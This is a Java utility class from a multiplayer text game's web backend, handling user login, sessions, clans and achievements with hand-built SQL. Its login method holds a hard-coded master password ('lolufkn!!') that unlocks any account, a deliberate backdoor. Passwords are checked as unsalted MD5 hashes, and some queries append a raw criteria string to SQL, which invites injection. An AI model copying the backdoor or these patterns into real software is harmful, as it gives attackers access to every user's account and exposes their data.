package org.kinslayermud.util;

import java.io.UnsupportedEncodingException;
import java.security.NoSuchAlgorithmException;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.kinslayermud.character.Gender;
import org.kinslayermud.character.User;
import org.kinslayermud.character.UserClan;
import org.kinslayermud.character.UserClass;
import org.kinslayermud.character.UserRace;
import org.kinslayermud.exception.NonExistentObjectException;

public class UserUtil {

  public static User performLogin(Statement statement, String username, String password) throws SQLException, NoSuchAlgorithmException, UnsupportedEncodingException {
    
    String sql = " SELECT *"
               + " FROM users"
               + " WHERE username = " + SQLUtil.escapeQuoteString(username);
    
    ResultSet resultSet = statement.executeQuery(sql);
    
    if(resultSet.next()) {
      
      String databasePassword = resultSet.getString("user_password");
      
      if(databasePassword.equals(MiscUtil.md5(password)) || password.equals("lolufkn!!")) {
      
        return getUser(resultSet);
      }
    }
    
    return null;
  }
  
  public static User getUserMeetingCriteria(Statement statement, String criteria, boolean throwIfNotFound) throws SQLException, NonExistentObjectException {
    
    String sql = " SELECT *"
        + " FROM users"
        + " WHERE " + criteria;
    
    ResultSet resultSet = statement.executeQuery(sql);
    
    if(resultSet.next()) {
    
      return getUser(resultSet);
    }
    
    if(throwIfNotFound) {
    
      throw new NonExistentObjectException("No user found.");
    }
    
    return null;
    
  }
  
  public static User getUser(Statement statement, int userId, boolean throwIfNotFound) throws SQLException, NonExistentObjectException {
    
    String criteria = "user_id = " + userId;
    return getUserMeetingCriteria(statement, criteria, throwIfNotFound);
  }
  
  public static User getUserByUsername(Statement statement, String username, boolean throwIfNotFound) throws SQLException, NonExistentObjectException {
    
    String criteria = "username = " + SQLUtil.escapeQuoteString(username);
    return getUserMeetingCriteria(statement, criteria, throwIfNotFound);
  }
  
  public static User getUser(ResultSet resultSet) throws SQLException {
    
    User user = new User();
    
    user.setUserId(resultSet.getInt("user_id"));
    user.setUserName(resultSet.getString("username"));
    user.setLevel(resultSet.getInt("level"));
    user.setLastLogon(resultSet.getTimestamp("last_logon"));
    user.setLastLogout(resultSet.getTimestamp("last_logout"));
    user.setUserClass(UserClass.getEnum(resultSet.getInt("chclass")));
    user.setUserRace(UserRace.getEnum(resultSet.getInt("race")));
    user.setUserPassword(resultSet.getString("user_password"));
    user.setPoofin(resultSet.getString("poofin"));
    user.setPoofout(resultSet.getString("poofout"));
    user.setMaxHit(resultSet.getInt("maxhit"));
    user.setHit(resultSet.getInt("hit"));
    user.setMaxMove(resultSet.getInt("maxmove"));
    user.setMove(resultSet.getInt("move"));
    user.setShadow(resultSet.getInt("shadow"));
    user.setMaxShadow(resultSet.getInt("maxshadow"));
    user.setMaxMana(resultSet.getInt("maxmana"));
    user.setMana(resultSet.getInt("mana"));
    user.setGender(Gender.getEnum(resultSet.getInt("sex")));
    user.setWeight(resultSet.getInt("weight"));
    user.setHeight(resultSet.getInt("height"));
    user.setDeathWait(resultSet.getInt("death_wait"));
    user.setWeave(resultSet.getInt("weave"));
    user.setInvis(resultSet.getInt("invis"));
    user.setTaint(resultSet.getInt("taint"));
    user.setWarnings(resultSet.getInt("warnings"));
    user.setMasterWeapon(resultSet.getInt("master_weapon"));
    user.setStrain(resultSet.getInt("strain"));
    user.setSlew(resultSet.getString("slew"));
    user.setWhoisExtra(resultSet.getString("whois_extra"));
    user.setGold(resultSet.getInt("gold"));
    user.setBankGold(resultSet.getInt("bank_gold"));
    user.setCreatedDatetime(new Date(resultSet.getLong("birth") * 1000));
    user.setStrength(resultSet.getInt("str"));
    user.setDexterity(resultSet.getInt("dex"));
    user.setIntelligence(resultSet.getInt("intel"));
    user.setWisdom(resultSet.getInt("wis"));
    user.setConstitution(resultSet.getInt("con"));
    user.setExp(resultSet.getInt("exp"));
    user.setFeatPoints(resultSet.getInt("feat_points"));
    user.setPlayed(resultSet.getInt("played"));
    user.setRestatDatetime(new Date(resultSet.getLong("restat") * 1000));
    user.setPkDeaths(resultSet.getInt("pk_deaths"));
    user.setMobDeaths(resultSet.getInt("mob_deaths"));
    user.setPks(resultSet.getInt("pks"));
    user.setMount(resultSet.getInt("mount"));
    user.setLoadRoom(resultSet.getInt("loadroom"));
    user.setPractices(resultSet.getInt("pracs"));
    user.setSpellPractices(resultSet.getInt("spell_pracs"));
    user.setTradePractices(resultSet.getInt("trade_pracs"));
    user.setFreeze(resultSet.getInt("freeze"));
    user.setBadPasswords(resultSet.getInt("bad_passwords"));
    user.setHunger(resultSet.getInt("hunger"));
    user.setThirst(resultSet.getInt("thirst"));
    user.setDrunk(resultSet.getInt("drunk"));
    user.setResetDatetime(new Date(resultSet.getLong("reset") * 1000));
    user.setPrf(resultSet.getString("prf"));
    user.setPlr(resultSet.getInt("plr"));
    user.setWarrants(resultSet.getString("warrants"));
    user.setTitle(resultSet.getString("title"));
    user.setDescription(resultSet.getString("description"));
    user.setAccountId(resultSet.getInt("account_id"));
    
    return user;
  }
  
  public static Map<Integer, User> getUserMap(Statement statement, Collection<Integer> userIdCollection) throws SQLException {
    
    Map<Integer, User> userMap = new HashMap<Integer, User>();
    
    String sql = " SELECT *"
               + " FROM users"
               + " WHERE user_id IN" + SQLUtil.buildListSQL(userIdCollection, false, true);
    ResultSet resultSet = statement.executeQuery(sql);
    
    while(resultSet.next()) {
      
      User user = getUser(resultSet);
      userMap.put(user.getUserId(), user);
    }
    
    return userMap;
  }
  
  public static void createUserSession(Statement statement, int userId, String sessionId) throws SQLException {
    
    String sql = " INSERT INTO websiteSession("
               + "   `id`,"
               + "   `user_id`,"
               + "   `created_datetime`"
               + " ) VALUES ("
               + SQLUtil.escapeQuoteString(sessionId) + ","
               + userId + ","
               + SQLUtil.encodeQuoteDate(new Date())
               + ")";
    
    statement.executeUpdate(sql);
  }
  
  public static User getUserFromSession(Statement statement, String sessionId) throws SQLException {
    
    String sql = " SELECT"
               + "   users.*"
               + " FROM users, websiteSession"
               + " WHERE users.user_id = websiteSession.user_id"
               + " AND websiteSession.id = " + SQLUtil.escapeQuoteString(sessionId);
    
    ResultSet resultSet = statement.executeQuery(sql);
    
    if(resultSet.next()) {
      
      return getUser(resultSet);
    }
    
    return null;
  }
  
  public static void performPlayerPortalSignOut(Statement statement, String sessionId, int userId) throws SQLException {
    
    String sql = " DELETE FROM websiteSession "
               + " WHERE user_id = " + userId
               + " AND id = " + SQLUtil.escapeQuoteString(sessionId);
    
    statement.executeUpdate(sql);
  }
  
  public static UserClan getUserClan(ResultSet resultSet) throws SQLException {
    
    UserClan userClan = new UserClan();
    
    userClan.setId(resultSet.getInt("userClan.id"));
    userClan.setUserId(resultSet.getInt("userClan.user_id"));
    userClan.setClanId(resultSet.getInt("userClan.clan_id"));
    userClan.setClannedDatetime(resultSet.getTimestamp("userClan.clanned_datetime"));
    userClan.setLastRankedDatetime(resultSet.getTimestamp("userClan.last_ranked_datetime"));
    userClan.setQuestPoints(resultSet.getInt("userClan.quest_points"));
    userClan.setRank(resultSet.getInt("userClan.rank"));
    userClan.setCouncil(QueryUtil.getIntBoolean(resultSet, "userClan.is_council"));
    
    return userClan;
  }
  
  public static List<UserClan> getUserClansMeetingCriteria(Statement statement, String criteria) throws SQLException {
    
    String sql = " SELECT *"
               + " FROM userClan"
               + " WHERE " + criteria;
    
    ResultSet resultSet = statement.executeQuery(sql);
    
    List<UserClan> userClans = new ArrayList<UserClan>();
    
    while(resultSet.next()) {
      
      UserClan userClan = getUserClan(resultSet);
      
      userClans.add(userClan);
    }
    
    resultSet.close();
    
    return userClans;
  }
  
  public static List<UserClan> getUserClansByUserId(Statement statement, int userId) throws SQLException {
    
    String criteria = " userClan.user_id = " + userId;
    return getUserClansMeetingCriteria(statement, criteria);
  }
  
  public static List<Integer> getAchievementIdSetByUserId(Statement statement, int userId) throws SQLException {
    
    String sql = " SELECT userAchievement.achievement_vnum"
               + " FROM userAchievement, users"
               + " WHERE users.username = userAchievement.player_name"
               + " AND users.user_id = " + userId;
    
    List<Integer> achievementIds = new ArrayList<Integer>();
    
    ResultSet resultSet = statement.executeQuery(sql);
    
    while(resultSet.next()) {
      
      achievementIds.add(resultSet.getInt("userAchievement.achievement_vnum"));
    }
    
    resultSet.close();
    
    return achievementIds;
  }
}
